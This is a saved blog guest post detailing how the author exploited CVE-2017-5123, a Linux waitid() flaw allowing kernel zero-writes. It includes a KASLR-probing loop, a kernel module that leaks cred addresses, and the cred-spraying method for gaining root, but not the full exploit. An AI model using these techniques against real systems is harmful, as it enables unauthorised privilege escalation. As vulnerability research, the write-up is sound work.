<!DOCTYPE html>
<!-- saved from url=(0059)https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/ -->
<html lang="en" itemscope="" itemtype="http://schema.org/WebPage"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Exploiting CVE-2017-5123</title>
  <meta property="og:title" content="Exploiting CVE-2017-5123">
  <meta name="twitter:title" content="Exploiting CVE-2017-5123">



  <meta name="description" content="This is a guest post by a young and talented Portuguese exploiter, Federico Bento. He won this year’s Pwnie for Epic Achievement exploiting TIOCSTI ioctl.
Days ago he posted a video demonstrating an exploit for CVE-2017-5123 and luckly for you I managed to convince him to do a write-up about it.
I hope you enjoy his work. Thanks Federico!">
  <meta property="og:description" content="This is a guest post by a young and talented Portuguese exploiter, Federico Bento. He won this year’s Pwnie for Epic Achievement exploiting TIOCSTI ioctl.
Days ago he posted a video demonstrating an exploit for CVE-2017-5123 and luckly for you I managed to convince him to do a write-up about it.
I hope you enjoy his work. Thanks Federico!">
  <meta name="twitter:description" content="This is a guest post by a young and talented Portuguese exploiter, Federico Bento. He won this year’s Pwnie for Epic Achievement exploiting TIOCSTI ioctl.
Days ago he posted a video …">



  <meta name="author" content="fG!">
  <link href="https://reverse.put.as/images/apple-worm-fav.png" rel="icon" type="image/x-icon">
  <meta property="og:image" content="https://reverse.put.as/images/apple-worm.png">
  <meta name="twitter:image" content="https://reverse.put.as/images/apple-worm.png">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="@osxreverser">
  <meta name="twitter:creator" content="@osxreverser">
  <meta property="og:url" content="https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/">
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="Reverse Engineering">

  <meta name="generator" content="Hugo 0.81.0">
  <link rel="canonical" href="https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/">
  <link rel="alternate" href="https://reverse.put.as/index.xml" type="application/rss+xml" title="Reverse Engineering">
  <link href="https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/" rel="feed" type="application/rss+xml" title="Reverse Engineering">
  <link rel="stylesheet" href="./2017 - Exploiting CVE-2017-5123_files/lato-font.css">
  <link rel="stylesheet" href="./2017 - Exploiting CVE-2017-5123_files/opensans-font.min.css">
  <link rel="stylesheet" href="./2017 - Exploiting CVE-2017-5123_files/highlight.css">
  <link rel="stylesheet" href="./2017 - Exploiting CVE-2017-5123_files/bootstrap.min.css">
  <link rel="stylesheet" href="./2017 - Exploiting CVE-2017-5123_files/all.min.css">
  <link rel="stylesheet" href="./2017 - Exploiting CVE-2017-5123_files/main.css">
</head>

  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>

    <div class="container collapse navbar-collapse" id="main-navbar">
      <div class="row">
        <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
        <ul class="nav navbar-nav navbar-right">
        
          
            <li>
                <a class="nav-item" title="Home" href="https://reverse.put.as/">Home</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="About" href="https://reverse.put.as/about/">About</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="Archives" href="https://reverse.put.as/post/">Archives</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="Crackmes" href="https://reverse.put.as/crackmes/">Crackmes</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="gdbinit" href="https://github.com/gdbinit/gdbinit">gdbinit</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="Papers" href="https://papers.put.as/">Papers</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="Patches" href="https://reverse.put.as/patches/">Patches</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="Categories" href="https://reverse.put.as/categories">Categories</a>
            </li>
          
        
          
            <li>
                <a class="nav-item" title="Tags" href="https://reverse.put.as/tags">Tags</a>
            </li>
          
        

        

        
      </ul>
    </div>
    </div>

    </div>

  </div>
</nav>




    
  
  
  




  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      
      <div class="container">
        <div class="row">
          <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
               <a href="https://reverse.put.as/"><img class="avatar-img" src="./2017 - Exploiting CVE-2017-5123_files/apple-worm.png" alt="Reverse Engineering"></a>
              
              <h1>Exploiting CVE-2017-5123</h1>
                
                <hr class="small">
                
                  <span class="post-meta">
  Posted on November 7, 2017
  
  
    - 
    
      @<a href="https://reverse.put.as/categories/security">security</a>
    
  
  
   
    
      #<a href="https://reverse.put.as/tags/linux">linux</a>
    
      #<a href="https://reverse.put.as/tags/cve-2017-5123">CVE-2017-5123</a>
    
      #<a href="https://reverse.put.as/tags/exploit">exploit</a>
    
      #<a href="https://reverse.put.as/tags/waitpid">waitpid</a>
    
      #<a href="https://reverse.put.as/tags/linux">linux</a>
    
      #<a href="https://reverse.put.as/tags/kernel">kernel</a>
    
      #<a href="https://reverse.put.as/tags/vulnerability">vulnerability</a>
    
  

  
</span>


                
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p>This is a guest post by a young and talented Portuguese exploiter, Federico Bento. He won this year’s Pwnie for Epic Achievement exploiting TIOCSTI ioctl.</p>
<p>Days ago he posted a video demonstrating an exploit for <strong>CVE-2017-5123</strong> and luckly for you I managed to convince him to do a write-up about it.</p>
<p>I hope you enjoy his work. Thanks Federico!</p>
<p>While this one was on a rush, I want to create another blog dedicated to Portuguese hackers and researchers content. We have some great talent on this country so hopefully I will be able to convince them to produce written content instead of just sitting in the shadows. Let’s see if they collaborate on this idea.<br>
If you are a Portuguese hacker &amp; researcher keep watching this space for news. If you already have some content (looking for all kinds of stuff, even Web related stuff is ok) please drop a mail to <strong><a href="mailto:chulo@put.as">chulo@put.as</a></strong> (hahahahah).</p>
<p>Have fun,<br>
fG!</p>
<p>And now off to Federico…</p>
<h2 id="introduction">Introduction</h2>
<p>This will be a quick write-up on how I exploited <strong>CVE-2017-5123</strong>, a Linux kernel vulnerability in the <strong>waitid()</strong> syscall for 4.12-4.13 versions. This vulnerability gives an attacker a <strong>write-not-what-only-where</strong> primitive, or in other words, the ability to write “non-controlled” user data to arbitrary kernel memory.</p>
<p><em>KASLR</em> is bypassed using memory probing and root obtained via <strong>cred struct</strong> spraying and location predictability.</p>
<p>The video demonstrating my exploit in action was published on November 5th, as it can be seen here, <a href="https://www.youtube.com/watch?v=DfwOJIcV5ZA">https://www.youtube.com/watch?v=DfwOJIcV5ZA</a>.</p>
<p>Surprisingly, Chris Salls independently published his own writeup and exploit on November 6th at <a href="https://salls.github.io/Linux-Kernel-CVE-2017-5123/">https://salls.github.io/Linux-Kernel-CVE-2017-5123/</a>. Awesome work there!</p>
<p>The Chrome Sandbox wasn’t in my scope though, I was after the more general case of arbitrary zero writes. AFAIK, this primitive by itself can’t be used to escape the Chrome Sandbox using Chris' techniques.</p>
<p>So now, November 7th (0:30 a.m here in Portugal!), I’ll be detailing how I used this <strong>write-not-what-only-where</strong> vulnerability without a single read to get root.</p>
<p>Obviously, given other vulnerabilities, such as certain infoleaks, it would be an instant game over.</p>
<p>What spiked my interest, was what could one actually do with only this vulnerability by itself, or other vulnerabilities of this type, assuming all vanilla kernel protections.</p>
<p>More generally, what can one do when they’re presented solely with arbitrary zero writes into kernel memory (multiple arbitrary zero writes).</p>
<p>It didn’t matter if this was <strong>CVE-2017-5123</strong> or other, I was after the techniques that could be used to increase our privileges with this primitive.</p>
<p>It’s powerful, but some would initially assume that it’s not enough these days.</p>
<h2 id="the-vulnerability">The vulnerability</h2>
<p><em>from kernel/exit.c</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">SYSCALL_DEFINE5(waitid, <span style="color:#66d9ef">int</span>, which, pid_t, upid, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">siginfo</span> __user <span style="color:#f92672">*</span>, 
                infop, <span style="color:#66d9ef">int</span>, options, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">rusage</span> __user <span style="color:#f92672">*</span>, ru)
{
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">rusage</span> r;
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">waitid_info</span> info <span style="color:#f92672">=</span> {.status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>};
    <span style="color:#66d9ef">long</span> err <span style="color:#f92672">=</span> kernel_waitid(which, upid, <span style="color:#f92672">&amp;</span>info, options, ru <span style="color:#f92672">?</span> <span style="color:#f92672">&amp;</span>r : NULL);
    <span style="color:#66d9ef">int</span> signo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

    <span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
        signo <span style="color:#f92672">=</span> SIGCHLD;
        err <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">if</span> (ru <span style="color:#f92672">&amp;&amp;</span> copy_to_user(ru, <span style="color:#f92672">&amp;</span>r, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">rusage</span>)))
            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
        }
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>infop)
            <span style="color:#66d9ef">return</span> err;

        user_access_begin();
        unsafe_put_user(signo, <span style="color:#f92672">&amp;</span>infop<span style="color:#f92672">-&gt;</span>si_signo, Efault);
        unsafe_put_user(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>infop<span style="color:#f92672">-&gt;</span>si_errno, Efault);
        unsafe_put_user(info.cause, <span style="color:#f92672">&amp;</span>infop<span style="color:#f92672">-&gt;</span>si_code, Efault);
        unsafe_put_user(info.pid, <span style="color:#f92672">&amp;</span>infop<span style="color:#f92672">-&gt;</span>si_pid, Efault);
        unsafe_put_user(info.uid, <span style="color:#f92672">&amp;</span>infop<span style="color:#f92672">-&gt;</span>si_uid, Efault);
        unsafe_put_user(info.status, <span style="color:#f92672">&amp;</span>infop<span style="color:#f92672">-&gt;</span>si_status, Efault);
        user_access_end();
        <span style="color:#66d9ef">return</span> err;
Efault:
        user_access_end();
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
}
</code></pre></div><p>The vulnerability here is that there is a missing <strong>access_ok()</strong> check in the <strong>waitid()</strong>
syscall since they’ve introduced <strong>unsafe_put_user()</strong> in version 4.12.</p>
<p>The macro <strong>access_ok()</strong> should basically ensure that the user specified pointer points to user space and not kernel space, since unprivileged users shouldn’t be able to write arbitrarily to kernel memory.</p>
<p>This is done by checking the address limit.</p>
<p><em>from arch/x86/include/asm/uaccess.h:</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#define user_addr_max() (current-&gt;thread.addr_limit.seg)
</span><span style="color:#75715e"></span>
...

<span style="color:#75715e">/*
</span><span style="color:#75715e"> * Test whether a block of memory is a valid user space address.
</span><span style="color:#75715e"> * Returns 0 if the range is valid, nonzero otherwise.
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">bool</span> __chk_range_not_ok(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> addr,  
                                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> size, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> limit)
{
    <span style="color:#75715e">/*
</span><span style="color:#75715e">     * If we have used "sizeof()" for the size,
</span><span style="color:#75715e">     * we know it won't overflow the limit (but
</span><span style="color:#75715e">     * it might overflow the 'addr', so it's
</span><span style="color:#75715e">     * important to subtract the size from the
</span><span style="color:#75715e">     * limit, not add it to the address).
</span><span style="color:#75715e">     */</span>
    <span style="color:#66d9ef">if</span> (__builtin_constant_p(size))
        <span style="color:#66d9ef">return</span> unlikely(addr <span style="color:#f92672">&gt;</span> limit <span style="color:#f92672">-</span> size);

    <span style="color:#75715e">/* Arbitrary sizes? Be careful about overflow */</span>
    addr <span style="color:#f92672">+=</span> size;
    <span style="color:#66d9ef">if</span> (unlikely(addr <span style="color:#f92672">&lt;</span> size))
        <span style="color:#66d9ef">return</span> true;
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">unlikely</span>(addr <span style="color:#f92672">&gt;</span> limit);
}

<span style="color:#75715e">#define __range_not_ok(addr, size, limit)                \
</span><span style="color:#75715e">({                                    \
</span><span style="color:#75715e">    __chk_user_ptr(addr);                        \
</span><span style="color:#75715e">    __chk_range_not_ok((unsigned long __force)(addr), size, limit); \
</span><span style="color:#75715e">})
</span><span style="color:#75715e"></span>
...

<span style="color:#75715e">#define access_ok(type, addr, size)                    \
</span><span style="color:#75715e">({                                    \
</span><span style="color:#75715e">    WARN_ON_IN_IRQ();                        \
</span><span style="color:#75715e">    likely(!__range_not_ok(addr, size, user_addr_max()));        \
</span><span style="color:#75715e">})
</span></code></pre></div><p>This means that this vulnerability allows an unprivileged user to specify a kernel address by using <strong>infop</strong> when calling <strong>waitid()</strong>, and the kernel will happily write to it.</p>
<p>What is actually written though is hardly controlled.</p>
<p>From Chris' post:</p>
<blockquote>
<p>info.status is a 32 bit int, but constrained to be 0 &lt; status &lt; 256.
info.pid can be somewhat controlled by repeatedly forking, but has a max value of 0x8000.</p>
</blockquote>
<p>This, however, did not interest me. What interested me was that we could write zeros into arbitrary kernel memory.</p>
<p>Here’s what differentiates my exploit from Chris' - If we could somehow find our cred’s structure, we could write zeros there to effectively get root privileges by overwriting <strong>cred-&gt;euid</strong> and <strong>cred-&gt;uid</strong>.</p>
<p><em>from include/linux/cred.h:</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">cred</span> {
    atomic_t    usage;
<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span style="color:#75715e"></span>    atomic_t    subscribers;    <span style="color:#75715e">/* number of processes subscribed */</span>
    <span style="color:#66d9ef">void</span>        <span style="color:#f92672">*</span>put_addr;
    <span style="color:#66d9ef">unsigned</span>    magic;
<span style="color:#75715e">#define CRED_MAGIC    0x43736564
</span><span style="color:#75715e">#define CRED_MAGIC_DEAD    0x44656144
</span><span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>    kuid_t        uid;        <span style="color:#75715e">/* real UID of the task */</span>
    kgid_t        gid;        <span style="color:#75715e">/* real GID of the task */</span>
    kuid_t        suid;        <span style="color:#75715e">/* saved UID of the task */</span>
    kgid_t        sgid;        <span style="color:#75715e">/* saved GID of the task */</span>
    kuid_t        euid;        <span style="color:#75715e">/* effective UID of the task */</span>
    kgid_t        egid;        <span style="color:#75715e">/* effective GID of the task */</span>
    kuid_t        fsuid;        <span style="color:#75715e">/* UID for VFS ops */</span>
    kgid_t        fsgid;        <span style="color:#75715e">/* GID for VFS ops */</span>
    <span style="color:#66d9ef">unsigned</span>    securebits;    <span style="color:#75715e">/* SUID-less security management */</span>
    kernel_cap_t    cap_inheritable; <span style="color:#75715e">/* caps our children can inherit */</span>
    kernel_cap_t    cap_permitted;    <span style="color:#75715e">/* caps we're permitted */</span>
    kernel_cap_t    cap_effective;    <span style="color:#75715e">/* caps we can actually use */</span>
    kernel_cap_t    cap_bset;    <span style="color:#75715e">/* capability bounding set */</span>
    kernel_cap_t    cap_ambient;    <span style="color:#75715e">/* Ambient capability set */</span>
<span style="color:#75715e">#ifdef CONFIG_KEYS
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>    jit_keyring;    <span style="color:#75715e">/* default keyring to attach requested
</span><span style="color:#75715e">                     * keys to */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">key</span> __rcu <span style="color:#f92672">*</span>session_keyring; <span style="color:#75715e">/* keyring inherited over fork */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">key</span>    <span style="color:#f92672">*</span>process_keyring; <span style="color:#75715e">/* keyring private to this process */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">key</span>    <span style="color:#f92672">*</span>thread_keyring; <span style="color:#75715e">/* keyring private to this thread */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">key</span>    <span style="color:#f92672">*</span>request_key_auth; <span style="color:#75715e">/* assumed request_key authority */</span>
<span style="color:#75715e">#endif
</span><span style="color:#75715e">#ifdef CONFIG_SECURITY
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span>        <span style="color:#f92672">*</span>security;    <span style="color:#75715e">/* subjective LSM security */</span>
<span style="color:#75715e">#endif
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">user_struct</span> <span style="color:#f92672">*</span>user;    <span style="color:#75715e">/* real user ID subscription */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">user_namespace</span> <span style="color:#f92672">*</span>user_ns; <span style="color:#75715e">/* user_ns the caps and keyrings are relative to. */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">group_info</span> <span style="color:#f92672">*</span>group_info;    <span style="color:#75715e">/* supplementary groups for euid/fsgid */</span>
    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">rcu_head</span>    rcu;        <span style="color:#75715e">/* RCU deletion hook */</span>
};
</code></pre></div><p>At this point we are completely blind though, we need a way to bypass KASLR and
find the kernel heap.</p>
<h2 id="kaslr-bypass-via-memory-probing">KASLR bypass via memory probing</h2>
<p>By using functions such as <strong>copy_from_user()</strong>, <strong>copy_to_user()</strong>, etc., we make sure that a kernel OOPS won’t happen when a bad address is specified by the user due to the page fault exception handler.</p>
<p>This makes sense, since unprivileged users shouldn’t be able to cause a DoS whenever they present an address that does not belong to the address space of the user space process.</p>
<p>The same happens by using <strong>unsafe_put_user()</strong>, which means that we can do some memory probing on the range of possible locations for the kernel heap!</p>
<p>I do this by using something along the lines of:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0xffff880000000000</span>; ; i<span style="color:#f92672">+=</span><span style="color:#ae81ff">0x10000000</span>) {
    pid <span style="color:#f92672">=</span> fork();
    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) 
    {
        <span style="color:#66d9ef">if</span>(syscall(__NR_waitid, P_PID, pid, (siginfo_t <span style="color:#f92672">*</span>)i, WEXITED, NULL) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) 
        {
            printf(<span style="color:#e6db74">"[+] Found %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, i);
            <span style="color:#66d9ef">break</span>;
        }
    }
    <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
        exit(<span style="color:#ae81ff">0</span>);
}
</code></pre></div><p>The trick here is that <strong>waitid()</strong> won’t return <strong>EFAULT</strong> when we present it a valid address, so we can do some memory probing this way.</p>
<p>Thanks for the enlightenment <em>spender</em>, not the exploits (well actually those were pretty cool at the time) :).</p>
<p>Now that we know where the kernel heap lives, how do we know where our cred’s structure live? The state of the kernel heap is pretty much unknown.</p>
<h2 id="heap-spraying">Heap Spraying</h2>
<p>At this point I already had a clear idea of what I wanted/needed.</p>
<ul>
<li>
<p>If we create hundreds or thousands of processes, hundreds or thousands of
cred structures will be created in the kernel heap.</p>
</li>
<li>
<p>So my idea was to create these many processes that will check in a loop if
they get euid of 0, by constantly calling <strong>geteuid()</strong>.</p>
</li>
<li>
<p>If <strong>geteuid()</strong> returns 0, it means that we have hit the jackpot! From there,
we can also write to <strong>cred-&gt;euid - 0x10</strong>, which is <strong>cred-&gt;uid</strong>.</p>
</li>
</ul>
<p>By spraying the heap we increase the probability of hitting our target, but it is obviously not 100% reliable, just like Chris mentions in his heap spray.</p>
<p>Given the primitive we have, heap spraying obviously helps here :).</p>
<p>When spraying the heap with multiple struct cred’s and observed their location, I noticed that some addresses are more likely than others to where the creds will reside, even after reboots.</p>
<p>This can be observed without the need for some kernel debugging if one wants to try it out easily, simply use this kernel module which prints where <strong>cred-&gt;euid</strong> lives.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/sched.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;        // for basic filesystem</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/proc_fs.h&gt;    // for the proc filesystem</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/seq_file.h&gt;    // for sequence files</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">proc_dir_entry</span><span style="color:#f92672">*</span> jif_file;

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>
<span style="color:#a6e22e">jif_show</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">seq_file</span> <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v)
{
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>
<span style="color:#a6e22e">jif_open</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">inode</span> <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">*</span>file)
{
     printk(<span style="color:#e6db74">"EUID: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#f92672">&amp;</span>current<span style="color:#f92672">-&gt;</span>cred<span style="color:#f92672">-&gt;</span>euid);
     <span style="color:#66d9ef">return</span> single_open(file, jif_show, NULL);
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">file_operations</span> jif_fops <span style="color:#f92672">=</span> {
    .owner    <span style="color:#f92672">=</span> THIS_MODULE,
    .open    <span style="color:#f92672">=</span> jif_open,
    .read    <span style="color:#f92672">=</span> seq_read,
    .llseek    <span style="color:#f92672">=</span> seq_lseek,
    .release    <span style="color:#f92672">=</span> single_release,
};

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init
<span style="color:#a6e22e">jif_init</span>(<span style="color:#66d9ef">void</span>)
{
    jif_file <span style="color:#f92672">=</span> proc_create(<span style="color:#e6db74">"jif"</span>, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#f92672">&amp;</span>jif_fops);

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>jif_file) {
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
    }

    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit
<span style="color:#a6e22e">jif_exit</span>(<span style="color:#66d9ef">void</span>)
{
    remove_proc_entry(<span style="color:#e6db74">"jif"</span>, NULL);
}

module_init(jif_init);
module_exit(jif_exit);

MODULE_LICENSE(<span style="color:#e6db74">"GPL"</span>);
</code></pre></div><p>By forking and opening <strong>/proc/jif</strong> repeatedly, we can later check the output of <strong>printk()</strong> using <strong>dmesg</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># dmesg | grep EUID\:</span>

<span style="color:#f92672">[</span>16485.192353<span style="color:#f92672">]</span> EUID: ffff88015e909a14
<span style="color:#f92672">[</span>16485.192415<span style="color:#f92672">]</span> EUID: ffff88015e9097d4
<span style="color:#f92672">[</span>16485.192475<span style="color:#f92672">]</span> EUID: ffff88015e909954
<span style="color:#f92672">[</span>16485.192537<span style="color:#f92672">]</span> EUID: ffff880126c627d4
<span style="color:#f92672">[</span>16485.192599<span style="color:#f92672">]</span> EUID: ffff88015e9094d4
<span style="color:#f92672">[</span>16485.192660<span style="color:#f92672">]</span> EUID: ffff88015e909414
<span style="color:#f92672">[</span>16485.192725<span style="color:#f92672">]</span> EUID: ffff88015e909294
<span style="color:#f92672">[</span>16485.192790<span style="color:#f92672">]</span> EUID: ffff88015e909054
<span style="color:#f92672">[</span>16485.192860<span style="color:#f92672">]</span> EUID: ffff8801358efdd4
<span style="color:#f92672">[</span>16485.192925<span style="color:#f92672">]</span> EUID: ffff8801358efd14
<span style="color:#f92672">[</span>16485.192991<span style="color:#f92672">]</span> EUID: ffff8801358efe94
<span style="color:#f92672">[</span>16485.193057<span style="color:#f92672">]</span> EUID: ffff88015e909354
<span style="color:#f92672">[</span>16485.193124<span style="color:#f92672">]</span> EUID: ffff88015e9091d4
<span style="color:#f92672">[</span>16485.193187<span style="color:#f92672">]</span> EUID: ffff8801358eff54
<span style="color:#f92672">[</span>16485.193249<span style="color:#f92672">]</span> EUID: ffff8801358efb94
<span style="color:#f92672">[</span>16485.193314<span style="color:#f92672">]</span> EUID: ffff8801358efa14
<span style="color:#f92672">[</span>16485.193381<span style="color:#f92672">]</span> EUID: ffff88015e909114
<span style="color:#f92672">[</span>16485.193449<span style="color:#f92672">]</span> EUID: ffff8801358ef894
<span style="color:#f92672">[</span>16485.193515<span style="color:#f92672">]</span> EUID: ffff8801358ef714
<span style="color:#f92672">[</span>16485.234054<span style="color:#f92672">]</span> EUID: ffff880125766d14
<span style="color:#f92672">[</span>16485.234150<span style="color:#f92672">]</span> EUID: ffff8801256e9954
<span style="color:#f92672">[</span>16485.234189<span style="color:#f92672">]</span> EUID: ffff8801256e9654
<span style="color:#f92672">[</span>16485.429875<span style="color:#f92672">]</span> EUID: ffff8801257661d4
<span style="color:#f92672">[</span>16485.429881<span style="color:#f92672">]</span> EUID: ffff8801256e9e94
<span style="color:#f92672">[</span>16485.603481<span style="color:#f92672">]</span> EUID: ffff8801358ef954
<span style="color:#f92672">[</span>16485.603543<span style="color:#f92672">]</span> EUID: ffff8801256e9b94
<span style="color:#f92672">[</span>16485.603582<span style="color:#f92672">]</span> EUID: ffff880126c62e94
<span style="color:#f92672">[</span>16485.603620<span style="color:#f92672">]</span> EUID: ffff8801358ef7d4
<span style="color:#f92672">[</span>16485.603658<span style="color:#f92672">]</span> EUID: ffff880126c62a14
<span style="color:#f92672">[</span>16485.603701<span style="color:#f92672">]</span> EUID: ffff880125766654
<span style="color:#f92672">[</span>16485.603743<span style="color:#f92672">]</span> EUID: ffff8801358ef654
<span style="color:#f92672">[</span>16485.603782<span style="color:#f92672">]</span> EUID: ffff8801257667d4
<span style="color:#f92672">[</span>16485.603824<span style="color:#f92672">]</span> EUID: ffff880125766a14
<span style="color:#f92672">[</span>16485.603864<span style="color:#f92672">]</span> EUID: ffff880125766b94
<span style="color:#f92672">[</span>16485.603906<span style="color:#f92672">]</span> EUID: ffff8801256e94d4
<span style="color:#f92672">[</span>16485.603943<span style="color:#f92672">]</span> EUID: ffff8801256e91d4
<span style="color:#f92672">[</span>16485.603979<span style="color:#f92672">]</span> EUID: ffff880126c62d14
<span style="color:#f92672">[</span>16485.604017<span style="color:#f92672">]</span> EUID: ffff88015e909654

<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>We can kind of guess where they might be located, but obviously it’s just guessing :).</p>
<p>So now we know that at heap base + some offset, the probability of hitting our target is kind of high compared to the rest.</p>
<p>And so I start writing to these and adding <strong>PAGESIZE</strong> in hope that we overwrite one of these processes' credentials.
If that happens, we win!</p>
<p>We can also have some fun disabling <em>SELinux</em> by overwriting <strong>selinux_enforcing</strong> and <strong>selinux_enabled</strong>, as seen in my other post, <a href="http://www.openwall.com/lists/oss-security/2017/10/25/2">http://www.openwall.com/lists/oss-security/2017/10/25/2</a>.</p>
<h2 id="the-exploit">The exploit</h2>
<p>If you’ve read everything all the way down here, then I’m sure you can write your own. It’s not that hard!
